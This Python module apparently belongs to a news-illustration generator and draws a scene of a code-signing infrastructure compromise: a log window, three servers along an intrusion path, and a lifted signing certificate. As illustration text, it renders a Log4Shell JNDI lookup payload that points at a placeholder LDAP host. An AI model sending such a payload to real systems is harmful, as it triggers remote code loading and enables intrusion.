"""Code-signing infrastructure compromise: an exploited server becomes the way
into the developer's build network, and the signing server's certificate
and key are lifted out — whoever holds them can sign software as the vendor.

Top left: the exploit request (a Log4Shell `${jndi:` lookup only when the
sources name Log4Shell/Log4j). Below: three server elevations along the
intrusion path (entry server -> build server -> signing server). Right: the
code-signing certificate pulled out of the signing server. Product names
appear only as plain-text labels when the sources name them."""
from __future__ import annotations

import random

from ..brief import EditorialBrief
from .. import type as T
from ..kit import Box, Doc, Palette, arrow, background, icon, pill, vignette, window
from . import scene

_ATTACK = ("exploited", "confirmed", "attacks_observed", "compromise")


def _server(doc: Doc, b: Box, label: str, *, units: int, led: str, hot: bool = False) -> None:
    """Rack server, front elevation with a shallow top face (3/4 feel)."""
    p = doc.pal
    depth = 22
    doc.add(f'<ellipse cx="{b.cx:.1f}" cy="{b.b + 14:.1f}" rx="{b.w * 0.52:.1f}" ry="12" fill="#000" '
            f'opacity="0.6" filter="{doc.blur(10)}"/>')
    # top face
    doc.poly([(b.x, b.y), (b.x + depth * 1.6, b.y - depth), (b.r + depth * 1.6, b.y - depth), (b.r, b.y)],
             doc.lin([(0, "#4A3A36", 1), (1, "#2C2220", 1)]))
    doc.poly([(b.r, b.y), (b.r + depth * 1.6, b.y - depth), (b.r + depth * 1.6, b.b - depth), (b.r, b.b)],
             "#1A1312")
    # front panel
    doc.rect(b.x, b.y, b.w, b.h, doc.lin([(0, "#3A2E2B", 1), (0.5, "#2A211F", 1), (1, "#1C1615", 1)]), 3,
             stroke="#55443F", sw=1.2)
    # rack ears with screws
    for ex in (b.x, b.r - 22):
        doc.rect(ex, b.y, 22, b.h, "#241C1A", 2)
        for k in range(units):
            doc.circle(ex + 11, b.y + (k + 0.5) * b.h / units, 4, "#0F0B0A", "#5D4B46", 1)
    # drive bays
    bays = int((b.w - 200) // 46)
    for i in range(bays):
        bx = b.x + 34 + i * 46
        doc.rect(bx, b.y + 12, 40, b.h - 24, "#17110F", 3, stroke="#3E312D", sw=1)
        for k in range(3):
            doc.line((bx + 8, b.y + 22 + k * 6), (bx + 32, b.y + 22 + k * 6), "#3E312D", 1.4)
        doc.circle(bx + 32, b.b - 22, 2.8, led if (i + units) % 3 else "#4ADE80", opacity=0.95)
    # control area + label plate
    cx = b.r - 156
    doc.rect(cx, b.y + 14, 120, 26, "#E9DDD2", 3)
    doc.text(T.fit(label, 15, 110, "mono_bold"), cx + 60, b.y + 32, 15, "#1F1715", "mono_bold", anchor="middle")
    doc.circle(cx + 14, b.b - 20, 7, "#17110F", "#5D4B46", 1.4)
    doc.circle(cx + 40, b.b - 20, 3.5, p.danger if hot else "#4ADE80")
    for k in range(4):
        doc.line((cx + 60 + k * 14, b.b - 28), (cx + 60 + k * 14, b.b - 12), "#14100E", 3)


def _certificate(doc: Doc, pal: Palette, b: Box, subject: str) -> None:
    """A code-signing certificate drawn as a document card with a seal."""
    doc.shadow(b.x, b.y, b.w, b.h, 10, 1.2)
    doc.rect(b.x, b.y, b.w, b.h, doc.lin([(0, "#FBF5EA", 1), (1, "#EFE4D2", 1)]), 10, stroke="#CDBA9C", sw=1.4)
    doc.rect(b.x + 12, b.y + 12, b.w - 24, b.h - 24, "none", 6, stroke="#D8C6A8", sw=1)
    ink, mute = "#2A201A", "#7C6A58"
    doc.text("CODE SIGNING CERTIFICATE", b.x + 34, b.y + 54, 16, ink, "ui_bold", tracking=1.8)
    rows = [("Subject", subject), ("Key usage", "Code Signing"), ("Private key", "present")]
    for i, (k, v) in enumerate(rows):
        y = b.y + 98 + i * 40
        doc.text(k, b.x + 34, y, 15, mute, "ui")
        doc.text(v, b.x + 150, y, 17, ink if i < 2 else pal.danger, "mono_bold" if i == 2 else "mono")
        doc.line((b.x + 34, y + 12), (b.r - 120, y + 12), "#E2D4BC", 1)
    # seal + ribbon
    sx, sy = b.r - 70, b.b - 70
    doc.poly([(sx - 16, sy + 10), (sx - 26, sy + 52), (sx - 8, sy + 42), (sx, sy + 58), (sx + 2, sy + 14)],
             "#9E2A1E")
    doc.poly([(sx + 16, sy + 10), (sx + 26, sy + 52), (sx + 8, sy + 42), (sx, sy + 58), (sx - 2, sy + 14)],
             "#B7342A")
    doc.circle(sx, sy, 34, doc.rad([(0, "#E5574A", 1), (1, "#A92A20", 1)]), "#7E1D15", 1.5)
    doc.circle(sx, sy, 25, "none", "#FBD4C9", 1.4, 0.7)
    icon(doc, "key", sx, sy, 26, "#FFF2EC", 2.2)


@scene("code_signing")
def code_signing(doc: Doc, brief: EditorialBrief, rng: random.Random) -> None:
    p = doc.pal
    background(doc, light=(0.72, 0.2), floor=640)
    text = brief.text or ""
    taken = brief.status in _ATTACK or any(k in text for k in ("compromis", "hijack", "stole", "stolen"))
    log4 = "log4shell" in text or "log4j" in text
    entry = "vCenter" if "vcenter" in text else "app-server"
    plate = "vcenter-01" if entry == "vCenter" else "app-01"

    # ---- the exploit request
    lw = Box(40, 64, 760, 196)
    lb = window(doc, lw, title="access.log", surface="#140D0C", chrome="#211615", depth=0.8)
    doc.text("POST /websso/SAML2/SSO HTTP/1.1" if entry == "vCenter" else "GET /login HTTP/1.1", lb.x + 26,
             lb.y + 40, 18, p.muted, "mono")
    doc.text("Host: " + ("vcenter.corp.example" if entry == "vCenter" else "app.corp.example"), lb.x + 26,
             lb.y + 74, 18, p.muted, "mono")
    hy = lb.y + 116
    doc.rect(lb.x + 12, hy - 26, lb.w - 24, 38, p.danger, 4, opacity=0.18)
    doc.rect(lb.x + 12, hy - 26, 4, 38, p.danger)
    payload = "${jndi:ldap://203.0.113.9:1389/a}" if log4 else "<crafted request>"
    w = doc.text("X-Forwarded-For: " if log4 else "body: ", lb.x + 26, hy, 19, p.ink, "mono")
    doc.text(payload, lb.x + 26 + w, hy, 19, "#FFB49A", "mono_bold")

    # ---- the intrusion path across three servers
    s1 = Box(70, 384, 520, 112)
    s2 = Box(380, 610, 440, 76)
    s3 = Box(1000, 590, 520, 150)
    _server(doc, s1, plate, units=2, led="#F5A524", hot=True)
    _server(doc, s2, "build-01", units=1, led="#F5A524", hot=taken)
    _server(doc, s3, "sign-01", units=3, led="#F5A524", hot=taken)
    arrow(doc, [(lb.x + 240, lw.b + 10), (lb.x + 240, s1.y - 34)], p.danger, sw=4, head=16)
    if log4:
        pill(doc, lb.x + 260, lw.b + 30, "Log4Shell", fg="#FFFFFF", bg=p.danger, size=15, font="ui_bold")
    path_c = p.danger if taken else p.muted
    arrow(doc, [(s1.r + 44, s1.cy - 10), (720, s1.cy - 10), (720, s2.y - 34)], path_c, sw=3, head=14,
          dash="10 8", smooth=False)
    arrow(doc, [(s2.r + 44, s2.cy - 6), (s3.x - 12, s2.cy - 6)], path_c, sw=3, head=14, dash="10 8")

    # ---- the certificate, lifted out of the signing server
    cert = Box(1010, 150, 500, 290)
    if taken:
        # empty slot where it sat + the lift
        doc.rect(s3.x + 120, s3.y - 22 + 4, 300, 8, "#000", 3, opacity=0.5)
        arrow(doc, [(s3.cx - 10, s3.y - 30), (s3.cx - 10, cert.b + 26)], p.danger, sw=5, head=20)
        doc.text("certificate + key exported", s3.cx + 14, (s3.y + cert.b) / 2 + 8, 17, "#FFB49A", "mono_bold")
        with doc.g(transform=f"rotate(-5 {cert.cx:.1f} {cert.cy:.1f})"):
            _certificate(doc, p, cert, "CN=Software Vendor LLC")
    else:
        with doc.g(opacity=0.85):
            _certificate(doc, p, cert, "CN=Software Vendor LLC")
        pill(doc, cert.cx, cert.b + 24, "exposed", fg="#FFFFFF", bg=p.warn, size=15, anchor="middle")

    vignette(doc, 0.5)
    doc.focus = Box(560, 120, 1000, 640)
